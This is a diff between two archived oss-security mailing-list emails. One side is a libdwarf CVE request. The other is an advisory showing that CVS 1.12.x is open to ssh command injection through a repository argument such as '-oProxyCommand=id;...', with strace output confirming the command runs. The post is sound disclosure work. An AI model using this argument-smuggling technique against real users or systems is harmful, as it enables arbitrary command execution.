@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["513" "Thursday" "10" "December" "2015" "09:13:38" "+0800" "xiaoqixue_1" "xiaoqixue_1@163.com" "<7e08d39e.3024.15189735e32.Coremail.xiaoqixue_1@163.com>" "9" "[oss-security] CVE request - a out of bound read bug is found in libdwarf" nil nil nil "12" "2015121001:13:38" "[oss-security] CVE request - a out of bound read bug is found in libdwarf" (number mark "U       xiaoqixue_1@ Dec 10    9/513   " thread-indent "\"[oss-security] CVE request - a out of bound read bug is found in libdwarf\"\n") "<245dc37c.114c5.15186364547.Coremail.xiaoqixue_1@163.com>" ("<273719694.18743924.1449624723028.JavaMail.zimbra@redhat.com>" "<245dc37c.114c5.15186364547.Coremail.xiaoqixue_1@163.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["2904" "Thursday" "10" "August" "2017" "17:32:24" "-0600" "Hank Leininger" "hlein@korelogic.com" "<20170810171047.5cdf7131-a82f-46f0-b4c4-3015acbc431b@korelogic.com>" "71" "[oss-security] CVS and ssh command injection (see CVE-2017-1000117, etc.)" nil nil nil "8" "2017081023:32:24" "[oss-security] CVS and ssh command injection (see CVE-2017-1000117, etc.)" (number mark "U       hlein@korelo Aug 10   71/2904  " thread-indent "\"[oss-security] CVS and ssh command injection (see CVE-2017-1000117, etc.)\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 3381 invoked by uid 550); 10 Dec 2015 01:13:54 -0000
+Received: (qmail 3080 invoked by uid 550); 11 Aug 2017 02:32:22 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,40 +12,85 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 3351 invoked from network); 10 Dec 2015 01:13:53 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=163.com;
-	s=s110527; h=Date:From:Subject:MIME-Version:Message-ID; bh=vANgv
-	v5TAYrZWoy19bH6fgH5SqAH/F4dN8ziozWecCw=; b=adTQgYWvndSEZOFdHpxxL
-	rAVc8epVBBON2TnOwC/9q1cfzJo/qC4JQjXelb4O0oxvlq+MAD3s9WqykTfKS0+d
-	QURH0pBvJ/GftF+Pcar7UftP6L/GimsJiDBlPWDp5MJHGSPU/Z4sdQrcfHDthIzH
-	ViLvMcS907jIowyvjgCLjM=
-X-Originating-IP: [166.111.131.12]
-Date: Thu, 10 Dec 2015 09:13:38 +0800 (CST)
-From: xiaoqixue_1  <xiaoqixue_1@163.com>
+Received: (qmail 29948 invoked from network); 10 Aug 2017 23:31:50 -0000
+Date: Thu, 10 Aug 2017 17:32:24 -0600
+From: Hank Leininger <hlein@korelogic.com>
 To: oss-security@lists.openwall.com
-Cc: cve-assign@mitre.org
-X-Priority: 3
-X-Mailer: Coremail Webmail Server Version SP_ntes V3.5 build
- 20150911(74783.7961) Copyright (c) 2002-2015 www.mailtech.cn 163com
-In-Reply-To: <245dc37c.114c5.15186364547.Coremail.xiaoqixue_1@163.com>
-References: <273719694.18743924.1449624723028.JavaMail.zimbra@redhat.com>
- <245dc37c.114c5.15186364547.Coremail.xiaoqixue_1@163.com>
-Content-Transfer-Encoding: base64
-Content-Type: text/plain; charset=UTF-8
+Message-ID: <20170810171047.5cdf7131-a82f-46f0-b4c4-3015acbc431b@korelogic.com>
 MIME-Version: 1.0
-Message-ID: <7e08d39e.3024.15189735e32.Coremail.xiaoqixue_1@163.com>
-X-CM-TRANSID:YcGowAD3_6PD0WhW87QCAA--.8435W
-X-CM-SenderInfo: 50ld015l0xvsqr6rljoofrz/1tbiJRTMvVUL8sBR4QACse
-X-Coremail-Antispam: 1U5529EdanIXcx71UUUUU7vcSsGvfC2KfnxnUU==
-Subject: [oss-security] CVE request - a out of bound read bug is found in
- libdwarf
+Content-Type: multipart/signed; micalg=pgp-sha256;
+	protocol="application/pgp-signature"; boundary="/Fj8Y87PmZ4bKoDi"
+Content-Disposition: inline
+Subject: [oss-security] CVS and ssh command injection (see CVE-2017-1000117, etc.)
 
-CgpTb3JyeSBmb3IgdGhlIHdyb25nIHRpdGxlIGluIGxhc3QgbWFpbC4KCgoK
-Pgo+YSBvdXQgb2YgYm91bmQgcmVhZCBidWcgaXMgZm91bmQgaW7CoCAgbGF0
-ZXN0IHJlbGVhc2UgdmVyc2lvbiBkd2FyZi0yMDE1MTExNCBieSBYaWFvIFFp
-eHVlIGFuZCBMaXV5dWUuCj7CoGFuZCB3ZSBoYXZlIHRlc3RlZCB0aGUgb3Ro
-ZXIgdmVyc2lvbiBkd2FyZi0yMDE0MDgwNSB3aGljaCBpcyBhbHNvIGFmZmVj
-dGVkLgo+Cj4KPlJlZCBIYXQgQnVnemlsbGE6Cj5odHRwczovL2J1Z3ppbGxh
-LnJlZGhhdC5jb20vc2hvd19idWcuY2dpP2lkPTEyODkzODUKPgo+Cj5VcHN0
-cmVhbSBwYXRjaCBhcHBsaWVkIGluIGxpYmR3YXJmLTIwMTUxMTE0LTIuZmMy
-NCBidWlsZC4KPsKgCj4gCg==
+--/Fj8Y87PmZ4bKoDi
+Content-Type: text/plain; charset=us-ascii
+Content-Disposition: inline
+Content-Transfer-Encoding: quoted-printable
+
+SSH command injection via -o... impacts CVS 1.12.x as well, if anybody
+still cares.
+
+The announcement for git mentions CVE-2017-1000117, CVE-2017-9800, and
+CVE-2017-1000116 for git, Subversion, Mercurial, but makes no mention
+of CVS.  None of those CVEs are currently viewable at
+https://cve.mitre.org/cgi-bin/cvename.cgi?name=3D , and I don't know if
+these were discussed on a private list prior to publication, and
+whether that discussion included CVS.
+
+CVS can be configured to use SSH for remote repos, such as with
+CVS_RSH=3Dssh.  In which case specifying a hostname of -o... triggers the
+same sort of thing:
+
+  $ strace -f -e execve cvs -d '-oProxyCommand=3Did;localhost:/bar' co yada=
+ 2>&1 | egrep id
+  execve("/usr/bin/cvs", ["cvs", "-d", "-oProxyCommand=3Did;localhost:/bar"=
+, "co", "yada"], 0x7ffe69f75a68 /* 139 vars */) =3D 0
+  [snip]
+  [pid 20003] execve("/usr/local/bin/ssh", ["ssh", "-oProxyCommand=3Did;loc=
+alhost", "cvs server"], 0x5fb1fc8420 /* 141 vars */) =3D -1 ENOENT (No such=
+ file or directory)
+  [pid 20003] execve("/usr/bin/ssh", ["ssh", "-oProxyCommand=3Did;localhost=
+", "cvs server"], 0x5fb1fc8420 /* 141 vars */) =3D 0
+  [pid 20004] execve("/bin/bash", ["/bin/bash", "-c", "exec id;localhost"],=
+ 0x32af5f10d0 /* 141 vars */) =3D 0
+  [pid 20004] execve("/usr/bin/id", ["id"], 0xec92226ae0 /* 141 vars */) =
+=3D 0
+  [pid 20004] +++ exited with 0 +++
+  [pid 20003] --- SIGCHLD {si_signo=3DSIGCHLD, si_code=3DCLD_EXITED, si_pid=
+=3D20004, si_uid=3D3612, si_status=3D0, si_utime=3D0, si_stime=3D0} ---
+  ssh_exchange_identification: Connection closed by remote host
+  [pid 20003] +++ exited with 255 +++
+  --- SIGCHLD {si_signo=3DSIGCHLD, si_code=3DCLD_EXITED, si_pid=3D20003, si=
+_uid=3D3612, si_status=3D255, si_utime=3D0, si_stime=3D0} ---
+
+Tested vanilla 1.12.13, and Gentoo 1.12.12-r11.
+
+Of course, the repo specification looks very odd, so tricking a victim
+may be harder than for SCM tools where it's prefixed by an ssh:// or
+masked behind a redirect.  Plus, first you would have find a victim.
+
+Thanks,
+
+--=20
+
+Hank Leininger <hlein@korelogic.com>
+5F6D DCC8 FF53 8093 EC39  127B 091E 7F7C E898 E86C
+
+--/Fj8Y87PmZ4bKoDi
+Content-Type: application/pgp-signature; name="signature.asc"
+Content-Description: Digital signature
+
+-----BEGIN PGP SIGNATURE-----
+
+iQEzBAEBCAAdFiEEX23cyP9TgJPsORJ7CR5/fOiY6GwFAlmM7QgACgkQCR5/fOiY
+6Gz0kQgA5ORzNGGtpAar4atw5XB6/c20EMvJQ/7lbKGNJzqNYJQUKTOgtOes4tYN
+diyCITLlAXLLWIuEiKhE937sbh5mF78rynPktY/dxJ6zqEaQf/fF5CJ6ycDG0xvw
++ZjCJ0QSVTB6hbZ/c3KwqqKLydw+kZVW+1S68loMOmmX0MuKgecCcTVIrGX917DH
+LfR4EZKfbof3skWyMvMoaBY3wasQDZabQxAbYtJkADvORTtVj0vqFKLPCtQczPg4
+za0ULDNoLZtc51SSK6hHa1HjcrDtvvu/UGagtnUB2GfG6v0qfU0r+XBw2Vuc6git
+UXvbF78RDA97pw3gpfo777WuuFZJ9g==
+=zjvc
+-----END PGP SIGNATURE-----
+
+--/Fj8Y87PmZ4bKoDi--
